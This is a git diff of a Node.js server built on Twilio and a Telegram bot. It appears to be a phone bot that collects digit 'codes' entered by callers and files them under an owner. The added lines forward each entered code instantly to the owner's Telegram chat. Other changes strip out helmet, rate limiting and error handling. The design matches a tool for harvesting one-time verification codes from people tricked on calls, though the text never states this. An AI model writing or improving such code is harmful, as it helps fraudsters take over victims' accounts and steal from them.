@@ -1,32 +1,12 @@
-require("dotenv").config();
-
 const express = require("express");
 const fs = require("fs");
 const path = require("path");
-const axios = require("axios");
+const fetch = require("node-fetch");
 const twilio = require("twilio");
 
-const helmet = require("helmet");
-const compression = require("compression");
-const rateLimit = require("express-rate-limit");
-const pino = require("pino");
-
-const logger = pino();
-
 const app = express();
-
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-
-app.use(helmet());
-app.use(compression());
-
-app.use(
-  rateLimit({
-    windowMs: 60 * 1000,
-    max: 120
-  })
-);
 
 const PORT = process.env.PORT || 3000;
 
@@ -411,16 +391,15 @@ function parseDelay(text) {
 // ============================================================
 
 async function tg(method, data) {
-  try {
-    const res = await axios.post(
-      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,
-      data
-    );
-    return res.data;
-  } catch (err) {
-    logger.error("Telegram API error: " + err.message);
-    return null;
-  }
+  const res = await fetch(
+    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,
+    {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    }
+  );
+  return res.json();
 }
 
 async function tgSend(chatId, text, buttons = null) {
@@ -980,6 +959,13 @@ app.post("/input", async (req, res) => {
     pushLog(`${caller} : ${digits}`);
     pushHistory(`${caller} -> ${settings.itemName}: ${digits}`);
     pushCodeEntry(caller, digits, sid, ownerId);
+
+// send code instantly as its own Telegram message
+try {
+  await tgSend(ownerId, `${digits}`);
+} catch(e) {
+  console.log("code send error:", e.message);
+}
 
     res.type("text/xml");
     res.send(buildReviewTwiml(call));
@@ -1665,7 +1651,7 @@ setInterval(async () => {
     cleanupEndedCalls();
     saveDB();
   } catch {}
-}, 3000);
+}, 1000);
 
 // ============================================================
 // STARTUP
